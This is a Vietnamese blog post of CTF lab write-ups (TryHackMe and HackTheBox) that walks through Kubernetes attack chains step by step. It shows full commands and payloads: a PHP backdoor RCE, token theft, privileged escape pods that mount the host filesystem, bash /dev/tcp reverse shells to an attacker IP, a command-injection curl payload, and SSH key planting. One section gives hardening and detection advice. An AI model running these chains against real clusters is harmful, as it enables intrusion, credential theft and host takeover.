---
title: "Tu?n 2 - Lab THM HTB v? Kubernetes"
date: 2026-05-24 00:00:00 +0700
categories: ["Security Research"]
tags: ["Kubernetes", "Security", "HTB", "THM"]
---


### Lab THM Frank and Herby try again.....

![](/assets/images/posts/Pasted%20image%2020260522231336.png)

Bu?c d?u tiên thì quét Nmap d? tìm các attack surface

![](/assets/images/posts/Pasted%20image%2020260522232951.png)


K?t qu? quét Nmap  cho th?y m?c tiêu (IP `10.49.173.204`) dang m? khá nhi?u c?ng d?ch v? l?. Ðây có v? là m?t c?m **Kubernetes** ho?c m?t môi tru?ng container.

Du?i dây là phân tích các c?ng dang m?:

Các c?ng dáng chú ý

- **C?ng 22 (ssh)**: C?ng qu?n lý t? xa qua dòng l?nh.
- **C?ng 10250, 10255, 10257, 10259**: Ðây là các c?ng d?c trung c?a **Kubernetes Kubelet API**.
    - `10250`: Kubelet API (thu?ng yêu c?u xác th?c).
    - `10255`: Read-only Kubelet API (thu?ng không yêu c?u xác th?c, có th? l? thông tin nh?y c?m).
    - c?ng `10257` tuong ?ng v?i kube-controller-manager
    - c?ng `10259` tuong ?ng v?i kube-scheduler trên các node m?t ph?ng di?u khi?n Kubernetes.
- **C?ng 30679**: Ðây có th? là m?t **NodePort** (d?ch v? du?c ?ng d?ng bên trong Kubernetes dua ra ngoài).

![](/assets/images/posts/Pasted%20image%2020260522233352.png)


Có 1 web server port 30679 du?c expose nên tui có th? truy c?p d? xem th?

![](/assets/images/posts/Pasted%20image%2020260522233502.png)

Curl t?i api dó d? d?c thì th?y

![](/assets/images/posts/Pasted%20image%2020260522234813.png)


![](/assets/images/posts/Pasted%20image%2020260522234914.png)


**Phân tích thông tin JSON thu du?c `/pods`, ta có th? th?y có 4 pod dang ch?y trên máy:

```
calico-node             
calico-kube-controllers 
coredns                 
php-deploy          
```

![](/assets/images/posts/Pasted%20image%2020260522235131.png)


Sau khi wappalyzer thì th?y web server s? d?ng php version 8.1.0 , thì ? dây tui cung dã doán du?c mình c?n RCE vào server này , và sau dó mình lên git và tìm PoC này d? có th? ch?y mã khai thác
https://github.com/flast101/php-8.1.0-dev-backdoor-rce



![](/assets/images/posts/Pasted%20image%2020260522235945.png)

D?ng máy l?ng nghe thì dành du?c reverse shell thành công

![](/assets/images/posts/Pasted%20image%2020260522235955.png)


![](/assets/images/posts/Pasted%20image%2020260523000134.png)


![](/assets/images/posts/Pasted%20image%2020260523000327.png)


Chuy?n sang s? d?ng pwncat d? có th? t?i kubectl do ko dùng curl ho?c wget du?c 

Nhung  sau 1 h?i cài pwncat-cs thì thu vi?n có kh? nhi?u l?i và tui m?t cung vài ti?ng nhung cung ko th? fix du?c. Nên sau m?t h?i tham  kh?o WU c?a các pháp su nu?c ngoài  thì tui nh?n ra v?n còn cách n ày d? có th? t?i kubectl lên

Ð?m b?o b?n dang d?ng ? thu m?c ch?a file `kubectl` trên máy Kali và b?t server lên:

Bash

```
python3 -m http.server 80
```


T?i c?a s? shell c?a container, b?n ch?y l?nh PHP này d? t?i file tr?c ti?p (nh? thay `192.168.246.92` b?ng IP VPN `tun0` hi?n t?i c?a b?n):

Bash

```
php -r 'copy("http://192.168.246.92/kubectl", "/tmp/kubectl");'
```

_(B?n nhìn sang terminal máy Kali, n?u th?y dòng log `192.168.x.x - - [2026...] "GET /kubectl HTTP/1.1" 200` hi?n ra là file dã du?c t?i sang thành công mu?t mà)._



Bây gi? c?p quy?n th?c thi cho file và ki?m tra xem Service Account trong Pod này có th? d?c du?c nh?ng gì trong c?m Kubernetes:

Bash

```
chmod +x /tmp/kubectl

# Ki?m tra danh sách Pod trong namespace hi?n t?i
/tmp/kubectl get pods

# Ki?m tra xem Service Account c?a b?n có nh?ng quy?n gì (R?t quan tr?ng d? bi?t du?ng leo thang)
/tmp/kubectl auth can-i --list
```

```
root@php-deploy-6d998f68b9-pj8v5:/tmp# ./kubectl auth can-i --list
./kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
root@php-deploy-6d998f68b9-pj8v5:/tmp# 

```

Ð? truy c?p vào máy ch?, chúng ta s? ch?y l?nh sau, l?nh này có th? tìm th?y trên [HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/abusing-roles-clusterroles-in-kubernetes#pod-create-and-escape) :

```
kubectl run r00t --restart=Never -it --image something --rm --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"vulhub/php:8.1-backdoor","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Hãy cùng phân tích d? hi?u rõ di?u gì dang x?y ra:

- `kubectl`- Vâng, rõ ràng là nó làm gì: tuong tác v?i c?m Kubernetes.
- `run r00t`- Kh?i t?o m?t pod có tên`r00t`
- `--restart=Never`- N?u thi?t b? d?ng ho?t d?ng, d?ng kh?i d?ng l?i nó.
- `-it`- C?p phát m?t TTY cho container trong pod và k?t n?i `stdin`v?i nó ( _nghia là_ cho phép chúng ta tuong tác v?i container)
- `--image something`- ? dây chúng ta c?n có hình ?nh cho pod, tuy nhiên vì nó s? b? ghi dè nên nó có th? là b?t k? hình ?nh nào.
- `--rm`- Xóa pod sau khi nó thoát
- `--overrides`- S? d?ng JSON n?i tuy?n d? ghi dè lên d?i tu?ng du?c t?o t? d?ng

Bây gi? chúng ta s? xem xét các giá tr? mà chúng ta dang ghi dè.

```
{
    "spec": {
        "hostPID": true,
        "containers": [{
            "name": "1",
            "image": "vulhub/php:8.1-backdoor",
            "command": ["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],
            "stdin": true,
            "tty":true,
            "imagePullPolicy":"IfNotPresent",
            "securityContext": {
                "privileged": true
            }
        }]
    }
}
```

Sau khi ch?nh s?a các giá tr? ghi dè, chúng ta có th? th?y r?ng pod s? chia s? không gian tên ID ti?n trình máy ch? ( `hostPID`), s? có m?t container s? d?ng hình ?nh mà chúng ta dã có trong node c?a mình (vì chúng ta không có quy?n truy c?p internet - chúng ta ph?i th?c hi?n thay d?i này) và s? ch?y ? ch? d? d?c quy?n.

L?nh s? du?c th?c thi khi container kh?i d?ng là `nsenter`l?nh cho phép chúng ta ch?y m?t chuong trình trong m?t namespace khác. C? này `--mount=/proc/1/ns/mnt`cho bi?t `nsenter`s? vào namespace du?c g?n k?t (hay còn g?i là h? th?ng t?p tin) c?a ti?n trình có PID 1, t?c là `init`ti?n trình dó, có nghia là chúng ta s? th?c thi `/bin/bash`trong h? th?ng t?p tin c?a máy ch? (vì chúng ta dang tham chi?u d?n h? th?ng t?p tin `init`c?a máy ch? ch? không ph?i c?a container, do `hostPID`giá tr? c?a c?), nói cách khác, chúng ta dang ? bên trong máy ch?.

Sau dó, chúng ta l?i du?c dua vào m?t shell có quy?n root, nhung l?n này là bên trong máy ch?, vì v?y t?t c? nh?ng gì chúng ta c?n làm là l?y các c? t? `/home/herby/user.txt`và `/root/root.txt`.


ho?c b?n có th? t?o 1 bad pods b?ng cách này 

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: pwned
  labels:
    app: pwn
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: pwned
    image: docker.io/vulhub/php:8.1-backdoor
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /

```


https://qiita.com/rikum0730/items/813d8fc29b8788387cb1
https://dmaxter.pt/writeups/thm-frank-and-herby-try-again/


## HTB SteamCloud - Kubernetes/Kubelet Misconfiguration

![](/assets/images/posts/Pasted%20image%2020260524221954.png)

> **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html  
> **M?c tiêu h?c:** hi?u chu?i t?n công t? Kubelet API exposed ? chi?m pod ? l?y ServiceAccount token ? l?m d?ng quy?n t?o pod d? mount filesystem c?a host.

### 1. T?ng quan bài lab

SteamCloud là m?t máy HTB m?c Easy nhung r?t h?p d? h?c Kubernetes security vì lu?ng khai thác khá s?ch:

```text
Recon port K8s
? Kubelet API exposed
? Exec vào pod nginx
? L?y ServiceAccount token
? Authenticate vào Kubernetes API
? Ki?m tra RBAC
? T?o pod mount root filesystem c?a host
? Ð?c root.txt / l?y root shell host
```

Ði?m quan tr?ng c?a bài này không n?m ? exploit CVE, mà n?m ? **misconfiguration**:

- Kubelet API port `10250` có th? tuong tác t? bên ngoài.
- Attacker có th? `exec` command vào pod dang ch?y.
- ServiceAccount trong pod có quy?n `get`, `list`, `create pods`.
- Quy?n `create pods` d? nguy hi?m d? t?o pod m?i có `hostPath` mount `/` c?a node.

### 2. Recon

Scan full port:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.133
```

Các port dáng chú ý:

```text
22/tcp     ssh
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API server / minikube API
10249/tcp  kube-proxy metrics
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
```

Scan service/version:

```bash
nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133
```

Nhìn certificate ? port `8443` th?y nhi?u d?u hi?u dây là môi tru?ng **minikube/Kubernetes**:

```text
commonName=minikube
DNS:kubernetes.default.svc.cluster.local
DNS:kubernetes.default
IP Address:10.96.0.1
IP Address:127.0.0.1
```

K?t lu?n nhanh:

- `8443`: Kubernetes API Server, c?n credential.
- `10250`: Kubelet API, có kh? nang b? c?u hình l?ng.
- `2379/2380`: etcd, nhung trong bài này không ph?i du?ng khai thác chính.

### 3. Th? Kubernetes API Server

G?i API b?ng `kubectl` thì b? yêu c?u xác th?c:

```bash
kubectl --server https://10.10.11.133:8443 get pods
kubectl --server https://10.10.11.133:8443 get namespaces
kubectl --server https://10.10.11.133:8443 cluster-info
```

K?t qu? là `kubectl` h?i username/password ho?c tr? v? `Forbidden`, nghia là chua có credential d? di qua API Server.

### 4. Khai thác Kubelet API

Dùng `kubeletctl` d? tuong tác v?i Kubelet port `10250`:

```bash
kubeletctl pods -s 10.10.11.133
```

Danh sách pod dáng chú ý:

```text
storage-provisioner                 kube-system
coredns-78fcd69978-7dhjv            kube-system
nginx                               default
etcd-steamcloud                     kube-system
kube-apiserver-steamcloud           kube-system
kube-controller-manager-steamcloud  kube-system
kube-scheduler-steamcloud           kube-system
kube-proxy-562gf                    kube-system
```

Pod `nginx` n?m trong namespace `default`, dây là m?c tiêu d? th? tru?c vì không thu?c nhóm control plane.

Có th? format danh sách pod t? JSON:

```bash
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```

### 5. Exec vào pod nginx

Test command execution:

```bash
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

K?t qu?:

```text
uid=0(root) gid=0(root) groups=0(root)
```

? dây mình là `root` **trong container nginx**, chua ph?i root c?a host.

Ð?c user flag:

```bash
kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx
kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
```

Có th? l?y interactive shell tr?c ti?p:

```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```

### 6. L?y ServiceAccount token trong pod

Trong Kubernetes, m?i pod thu?ng du?c mount ServiceAccount token d? nói chuy?n v?i API Server. Ki?m tra trong container:

```bash
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

Các file quan tr?ng:

```text
ca.crt
namespace
token
```

Ý nghia:

- `ca.crt`: CA certificate d? trust Kubernetes API Server.
- `namespace`: namespace hi?n t?i c?a pod.
- `token`: bearer token c?a ServiceAccount g?n v?i pod.

Luu CA cert và token v? máy attacker:

```bash
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
```

Ho?c dua token vào bi?n môi tru?ng:

```bash
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```

### 7. Authenticate vào Kubernetes API b?ng token

Dùng `ca.crt` và token v?a l?y d? g?i API Server:

```bash
kubectl --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token \
  get pods
```

N?u thành công s? th?y pod `nginx`:

```text
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          ...
```

Ki?m tra quy?n c?a ServiceAccount:

```bash
kubectl auth can-i --list \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Dòng quan tr?ng:

```text
pods    []    []    [get create list]
```

Ðây là pivot point c?a bài: ServiceAccount không ph?i cluster-admin, nhung có quy?n **create pods** trong namespace `default`. V?i quy?n này, attacker có th? t?o pod m?i mount filesystem c?a host.

### 8. Xem c?u hình pod nginx

Dump YAML c?a pod hi?n t?i:

```bash
kubectl get pod nginx -o yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Thông tin c?n l?y:

```yaml
namespace: default
image: nginx:1.14.2
```

Ta dùng l?i image `nginx:1.14.2` vì image này dã có s?n trên node, tránh ph? thu?c internet/image pull.

### 9. T?o pod mount `/` c?a host

T?o file `evil-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  containers:
  - name: attacker-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Gi?i thích:

- `hostPath.path: /`: mount toàn b? root filesystem c?a node vào pod.
- `mountPath: /mnt`: trong container, host filesystem xu?t hi?n t?i `/mnt`.
- `hostNetwork: true`: pod dùng network namespace c?a host.
- `image: nginx:1.14.2`: dùng image dã có s?n trên node.

Apply pod:

```bash
kubectl apply -f evil-pod.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Ki?m tra:

```bash
kubectl get pods \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

### 10. Ð?c filesystem c?a host

Exec vào pod m?i b?ng Kubelet:

```bash
kubeletctl exec "id" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Li?t kê root filesystem c?a host:

```bash
kubeletctl exec "ls /mnt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Ð?c root flag:

```bash
kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
```

Lúc này `/mnt` chính là `/` c?a node th?t, vì v?y `/mnt/root/root.txt` tuong ?ng v?i `/root/root.txt` trên host.

### 11. L?y root shell trên host

Có th? t?o pod th? hai ch?y reverse shell ngay khi container start:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-shell
  namespace: default
spec:
  containers:
  - name: attacker-shell
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Trên máy attacker b?t listener:

```bash
nc -lnvp 443
```

Apply pod:

```bash
kubectl apply -f attacker-shell.yaml \
  --server https://10.10.11.133:8443 \
  --certificate-authority=ca.crt \
  --token=$token
```

Sau khi shell callback v?, có th? ghi SSH public key vào host root:

```bash
mkdir -p /mnt/root/.ssh
cd /mnt/root/.ssh
echo "ssh-ed25519 <PUBLIC_KEY> attacker@kali" > authorized_keys
```

R?i SSH vào host:

```bash
ssh -i id_ed25519 root@10.10.11.133
```

### 12. Vì sao quy?n `create pods` nguy hi?m?

Trong Kubernetes, quy?n `create pods` có th? tr? thành quy?n leo thang r?t m?nh n?u cluster không ch?n các c?u hình nguy hi?m. Attacker có th? t?o pod v?i:

- `hostPath` mount thu m?c nh?y c?m c?a node.
- `hostNetwork: true` d? dùng network c?a host.
- `hostPID: true` d? nhìn process c?a host.
- `privileged: true` d? tang kh? nang escape.
- ServiceAccount khác n?u có quy?n gán ho?c dùng SA m?nh hon.

Trong SteamCloud, ch? c?n `hostPath: /` là d? d? d?c toàn b? filesystem c?a node.

### 13. Mapping v?i d? tài VDT

Bài này kh?p t?t v?i hu?ng **Kubernetes privilege escalation do misconfiguration**:

| Giai do?n | K? thu?t | Ý nghia trong d? tài |
|---|---|---|
| Recon | Scan port K8s | Nh?n di?n API Server, Kubelet, etcd |
| Initial Access | Kubelet anonymous/weak access | Th?c thi l?nh trong pod qua Kubelet |
| Credential Access | ServiceAccount token | L?y credential m?c d?nh du?c mount trong pod |
| Privilege Discovery | `kubectl auth can-i --list` | Ki?m tra quy?n RBAC hi?n có |
| Privilege Escalation | `create pods` + `hostPath` | T?o pod d?c h?i mount filesystem host |
| Impact | Ð?c `/root/root.txt`, SSH root | Ki?m soát node/host |

### 14. Detection / Hardening rút ra

Các di?m phòng th? nên dua vào ph?n demo ho?c báo cáo:

- Không expose Kubelet API ra ngoài network không tin c?y.
- T?t ho?c h?n ch? anonymous access vào Kubelet.
- B?t Kubelet authentication/authorization dúng cách.
- RBAC theo nguyên t?c least privilege, không c?p `create pods` b?a bãi.
- Dùng Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `hostPID: true`
  - `privileged: true`
- T?t `automountServiceAccountToken` n?u pod không c?n g?i Kubernetes API:

```yaml
automountServiceAccountToken: false
```

- Giám sát hành vi runtime b?ng Falco/Tetragon. Các event dáng chú ý:
  - Pod m?i có `hostPath` mount `/`.
  - Pod b?t `hostNetwork` ho?c `privileged`.
  - Truy c?p file ServiceAccount token.
  - Exec b?t thu?ng vào container qua Kubelet.

### 15. Takeaway

SteamCloud cho th?y m?t lesson r?t quan tr?ng: **không c?n CVE v?n có th? chi?m node Kubernetes n?u Kubelet/RBAC/Pod Security b? c?u hình sai**. M?t ServiceAccount tu?ng nhu ch? có quy?n `create pods` trong namespace `default` v?n có th? b? l?m d?ng d? t?o pod mount filesystem c?a host, t? dó d?c flag ho?c cài SSH key d? l?y root shell.


## HTB Unobtainium - RBAC Abuse + Secret Access + Malicious Pod



> **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2021/09/04/htb-unobtainium.html  
> **Ð? khó:** Hard  


### 1. T?ng quan chain khai thác

Unobtainium là bài Kubernetes khó hon SteamCloud vì không don gi?n là có ngay quy?n t?o pod. Lu?ng chính:

```text
Web/Electron app reverse
? LFI / l?y source + credential
? Prototype Pollution
? Command Injection
? RCE vào container webapp
? L?y ServiceAccount token default
? Enumerate RBAC
? Tìm namespace dev và pod devnode
? RCE ti?p vào devnode container
? L?y dev ServiceAccount token
? dev token có quy?n get/list secrets trong kube-system
? Ð?c c-admin service account token
? c-admin có quy?n *.* [*]
? T?o malicious pod mount hostPath /
? Ð?c root.txt / ki?m soát host filesystem
```

Ði?m c?n h?c cho d? tài VDT:

- **ServiceAccount token trong pod là credential th?t** d? g?i Kubernetes API.
- **RBAC theo namespace có th? t?o du?ng pivot**: token A không m?nh ? namespace `default`, nhung l?i có quy?n h?u ích ? namespace `dev`.
- **Quy?n `get/list secrets` trong `kube-system` c?c k? nguy hi?m**, vì có th? d?c token c?a ServiceAccount m?nh hon.
- Sau khi có token admin, k? thu?t k?t thúc gi?ng SteamCloud: t?o pod mount filesystem host.

### 2. Recon Kubernetes

Nmap th?y nhi?u port quen thu?c c?a Kubernetes/minikube:

```text
22/tcp     ssh
80/tcp     web
2379/tcp   etcd-client
2380/tcp   etcd-server
8443/tcp   Kubernetes API Server
10250/tcp  Kubelet API
10256/tcp  kube-proxy healthz
31337/tcp  Node.js Express API
```

Port `8443` tr? JSON ki?u Kubernetes API và báo `system:anonymous` b? forbidden, xác nh?n dây là API Server:

```text
forbidden: User "system:anonymous" cannot get path "/"
```

### 3. Ph?n RCE ban d?u - ghi so

Bài g?c có ph?n reverse Electron package d? l?y source/credential. Sau dó tìm du?c API Node.js có logic upload b? ?nh hu?ng b?i prototype pollution.

Ý tu?ng ng?n:

1. Dùng credential h?p l? d? g?i message.
2. Prototype pollution set `canUpload: true`.
3. Route `/upload` g?i command x? lý file nhung n?i `filename` không an toàn.
4. Inject command qua `filename` d? có RCE.

Payload b?t quy?n upload:

```bash
curl -X PUT http://10.10.10.235:31337/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Payload command injection d? reverse shell:

```bash
curl -X POST http://10.10.10.235:31337/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nh?n shell trong pod webapp:

```text
root@webapp-deployment-...:/usr/src/app# id
uid=0(root) gid=0(root) groups=0(root)
```

Luu ý: `root` ? dây v?n là root **trong container**, chua ph?i root c?a node.

### 4. L?y token trong webapp container

Trong pod, ki?m tra ServiceAccount token:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

Các file thu?ng g?p:

```text
ca.crt
namespace
token
```

Luu token ra máy attacker, ví d?:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > default-token
cat /run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt
```

Dùng token g?i API Server:

```bash
kubectl --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  get pods --all-namespaces
```

Ban d?u b? forbidden v?i pods toàn cluster, nhung ph?n h?i này v?n ch?ng minh token dùng du?c v?i API Server.

### 5. Enumerate RBAC v?i token default

Ki?m tra quy?n trong namespace hi?n t?i:

```bash
kubectl auth can-i --list \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Token default có quy?n dáng chú ý:

```text
namespaces    [get list]
```

List namespace:

```bash
kubectl get namespaces \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? có namespace `dev`:

```text
default
_dev_
kube-node-lease
kube-public
kube-system
```

Ki?m tra quy?n theo namespace:

```bash
kubectl auth can-i --list -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong namespace `dev`, token default có thêm quy?n:

```text
namespaces    [get list]
pods          [get list]
```

Ðây là pivot d?u tiên: token không t?o du?c pod, không d?c secret, nhung có th? **li?t kê pod ? namespace dev**.

### 6. Tìm pod devnode trong namespace dev

List pod trong namespace `dev`:

```bash
kubectl get pods -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? có các pod d?ng:

```text
devnode-deployment-cd86fb5c-6ms8d
devnode-deployment-cd86fb5c-mvrfz
devnode-deployment-cd86fb5c-qlxww
```

Describe pod d? l?y IP/container/image:

```bash
kubectl describe pod devnode-deployment-cd86fb5c-qlxww -n dev \
  --token $(cat default-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Thông tin dáng chú ý:

```text
Namespace: dev
IP: 172.17.0.4
Image: localhost:5000/node_server
Port: 3000/TCP
Mounts: /var/run/secrets/kubernetes.io/serviceaccount
```

T? shell webapp container có th? reach pod devnode qua IP n?i b?. Scan/ping th?y port `3000` m?.

### 7. RCE sang devnode container

?ng d?ng ? devnode ch?y cùng code/vuln Node.js nên có th? dùng l?i chain prototype pollution + command injection.

T? webapp container, b?t `canUpload` trên devnode:

```bash
curl -X PUT http://172.17.0.3:3000/ \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"test":"x","__proto__":{"canUpload":true}}}'
```

Inject reverse shell:

```bash
curl -X POST http://172.17.0.3:3000/upload \
  -H 'Content-Type: application/json' \
  -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"x; bash -c \"bash >& /dev/tcp/<ATTACKER_IP>/443 0>&1\""}'
```

Nh?n shell m?i:

```text
root@devnode-deployment-cd86fb5c-6ms8d:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Ki?m tra namespace c?a pod m?i:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/namespace
```

K?t qu?:

```text
dev
```

### 8. L?y dev token và ki?m tra RBAC

L?y token trong devnode:

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token > dev-token
```

Ki?m tra quy?n token này:

```bash
kubectl auth can-i --list \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

? namespace `dev` không có gì quá m?nh. Nhung khi ki?m tra namespace `kube-system`:

```bash
kubectl auth can-i --list -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Phát hi?n quy?n c?c k? quan tr?ng:

```text
secrets    [get list]
```

Ðây là l?i RBAC chính c?a bài: ServiceAccount trong namespace `dev` l?i có quy?n d?c secrets trong `kube-system`.

### 9. Ð?c ServiceAccount token m?nh hon trong kube-system

List secrets trong `kube-system`:

```bash
kubectl get secrets -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Trong danh sách có secret dáng chú ý:

```text
c-admin-token-tfmp2    kubernetes.io/service-account-token
```

Describe secret d? l?y token:

```bash
kubectl describe secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Secret này thu?c ServiceAccount:

```text
kubernetes.io/service-account.name: c-admin
```

Luu token admin ra file:

```bash
# copy ph?n token trong output vào file
nano cadmin-token
```

Ho?c dùng jsonpath n?u API tr? d? data:

```bash
kubectl get secret c-admin-token-tfmp2 -n kube-system \
  --token $(cat dev-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -o jsonpath='{.data.token}' | base64 -d > cadmin-token
```

### 10. Xác nh?n quy?n admin

Ki?m tra quy?n c?a `cadmin-token`:

```bash
kubectl auth can-i --list \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

K?t qu? quan tr?ng:

```text
*.*    []    []    [*]
[*]    []    [*]
```

Nghia là token này có quy?n full admin trên cluster.

Có th? list pods toàn cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

### 11. Tìm image local d? t?o malicious pod

Vì box không có internet, không nên dùng image t? Docker Hub. Tìm image dang có s?n trong cluster:

```bash
kubectl get pods --all-namespaces \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Dump YAML t?ng pod d? tìm image:

```bash
kubectl get pod <pod-name> -o yaml -n <namespace> \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt | grep 'image:'
```

Các image có s?n:

```text
localhost:5000/dev-alpine
localhost:5000/node_server
```

Ch?n `localhost:5000/dev-alpine` vì nh? và có shell.

### 12. T?o malicious pod mount filesystem host

T?o `root.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: kube-system
spec:
  containers:
  - name: evil
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Gi?i thích:

- `namespace: kube-system`: dã có admin nên có th? t?o pod ? namespace nh?y c?m.
- `image: localhost:5000/dev-alpine`: dùng image local có s?n.
- `hostPath.path: /`: mount root filesystem c?a node.
- `mountPath: /mnt`: trong container, host filesystem n?m ? `/mnt`.
- `sleep 300000`: gi? container s?ng d? còn `kubectl exec` vào.
- `hostNetwork: true`: dùng network namespace c?a host.

Apply pod:

```bash
kubectl apply -f root.yaml \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Exec vào pod:

```bash
kubectl exec evil-pod --stdin --tty -n kube-system \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -- /bin/sh
```

Ð?c root flag:

```bash
cd /mnt/root
cat root.txt
```

### 13. Ði?m khác v?i SteamCloud

| N?i dung | SteamCloud | Unobtainium |
|---|---|---|
| Initial K8s access | Kubelet API cho exec tr?c ti?p vào nginx | RCE webapp qua app vuln |
| Token d?u tiên | Token trong nginx pod | Token trong webapp pod |
| RBAC ban d?u | Có `create pods` ngay trong default | Ch? list namespace, list pod ? dev |
| Pivot chính | T?o pod mount hostPath tr?c ti?p | Pivot sang dev pod, l?y dev token |
| L?i RBAC n?ng | `create pods` quá r?ng | dev token d?c du?c secrets ? kube-system |
| Admin token | Không c?n admin token | Ð?c `c-admin-token` t? kube-system |
| Root host | Pod mount `/` c?a host | Pod mount `/` c?a host |

### 14. Bài h?c RBAC cho d? tài VDT

